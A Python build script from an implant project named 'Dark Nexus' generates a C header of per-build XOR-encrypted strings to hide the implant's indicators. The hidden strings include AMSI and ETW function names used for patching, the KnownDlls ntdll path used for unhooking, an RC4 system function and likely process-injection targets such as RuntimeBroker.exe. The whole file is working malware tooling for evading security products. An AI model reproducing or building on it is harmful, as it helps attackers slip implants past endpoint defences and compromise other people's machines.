#!/usr/bin/env python3
"""
Dark Nexus - Build-time String Encryption Tool

Generates strings_table.h containing XOR-encrypted versions of all
sensitive string literals used by the implant. The encryption key
is randomly generated per build, so each build produces unique
ciphertext even for the same plaintext strings.

Usage:
    python3 encrypt_strings.py > ../src/evasion/strings_table.h

The generated header contains:
    - A 16-byte XOR key (DN_STR_KEY)
    - An array of encrypted byte arrays (g_enc_strings)
    - Length metadata for each string (g_enc_lengths)
"""

import os
import sys
import struct

# String table: index must match the #defines in strings_encrypt.h
STRINGS = [
    # Core DLL names (0-7)
    "ntdll.dll",                              # DN_STR_NTDLL
    "kernel32.dll",                           # DN_STR_KERNEL32
    "advapi32.dll",                           # DN_STR_ADVAPI32
    "amsi.dll",                               # DN_STR_AMSI
    "winhttp.dll",                            # DN_STR_WINHTTP
    "bcrypt.dll",                             # DN_STR_BCRYPT
    "ws2_32.dll",                             # DN_STR_WS2_32
    "user32.dll",                             # DN_STR_USER32

    # API function names (8-14)
    "EtwEventWrite",                          # DN_STR_ETWWRITE
    "AmsiScanBuffer",                         # DN_STR_AMSISCAN
    "RtlInitUnicodeString",                   # DN_STR_RTLINITUSTR
    "LoadLibraryA",                           # DN_STR_LOADLIBA
    "GetProcAddress",                         # DN_STR_GETPROCADDR
    "VirtualProtect",                         # DN_STR_VIRTUALPROTECT
    "SystemFunction032",                      # DN_STR_SYSFN032

    # System paths (15-18)
    "C:\\Windows\\System32\\",                # DN_STR_SYSTEM32
    "notepad.exe",                            # DN_STR_NOTEPAD
    "C:\\Windows\\System32\\RuntimeBroker.exe",  # DN_STR_RTBROKER
    "C:\\Windows\\System32\\mshtml.dll",       # DN_STR_MSHTML

    # KnownDlls (19)
    "\\KnownDlls\\ntdll.dll",                # DN_STR_KNOWNDLLS

    # User agent (20)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",  # DN_STR_USERAGENT

    # Environment (21-22)
    "USERDOMAIN",                             # DN_STR_USERDOMAIN
    "WORKGROUP",                              # DN_STR_WORKGROUP
]

def xor_encrypt(plaintext: bytes, key: bytes) -> bytes:
    """XOR encrypt plaintext with repeating key."""
    return bytes(p ^ key[i % len(key)] for i, p in enumerate(plaintext))

def format_bytes(data: bytes, indent: str = "        ") -> str:
    """Format bytes as C hex array initializer."""
    parts = []
    for i in range(0, len(data), 12):
        chunk = data[i:i+12]
        hex_vals = ", ".join(f"0x{b:02X}" for b in chunk)
        parts.append(f"{indent}{hex_vals}")
    return ",\n".join(parts)

def main():
    # generate a random 16-byte key for this build
    key = os.urandom(16)

    out = []
    out.append("#ifndef DN_STRINGS_TABLE_H")
    out.append("#define DN_STRINGS_TABLE_H")
    out.append("")
    out.append("/*")
    out.append(" * AUTO-GENERATED by encrypt_strings.py")
    out.append(" * Do not edit manually. Re-run the script to regenerate.")
    out.append(" *")
    out.append(f" * {len(STRINGS)} encrypted strings")
    out.append(" */")
    out.append("")

    # emit the key
    key_hex = ", ".join(f"0x{b:02X}" for b in key)
    out.append(f"static const unsigned char DN_STR_KEY[16] = {{ {key_hex} }};")
    out.append("")

    # emit lengths array
    out.append(f"static const int g_enc_lengths[{len(STRINGS)}] = {{")
    length_vals = ", ".join(str(len(s)) for s in STRINGS)
    out.append(f"    {length_vals}")
    out.append("};")
    out.append("")

    # find max string length for fixed-size 2D array
    max_len = max(len(s) for s in STRINGS)
    out.append(f"#define DN_STR_MAX_LEN {max_len}")
    out.append("")

    # emit encrypted strings as a 2D array
    out.append(f"static const unsigned char g_enc_strings[{len(STRINGS)}][{max_len}] = {{")
    for i, s in enumerate(STRINGS):
        plaintext = s.encode("ascii")
        # pad to max_len with random bytes (they won't be read past length)
        padded = plaintext + os.urandom(max_len - len(plaintext))
        encrypted = xor_encrypt(padded, key)
        comment = s.replace("\\", "\\\\")
        if len(comment) > 40:
            comment = comment[:37] + "..."
        out.append(f"    /* [{i:2d}] {comment} */")
        out.append(f"    {{")
        out.append(format_bytes(encrypted))
        out.append(f"    }},")
    out.append("};")
    out.append("")
    out.append("#endif // DN_STRINGS_TABLE_H")
    out.append("")

    print("\n".join(out))

if __name__ == "__main__":
    main()
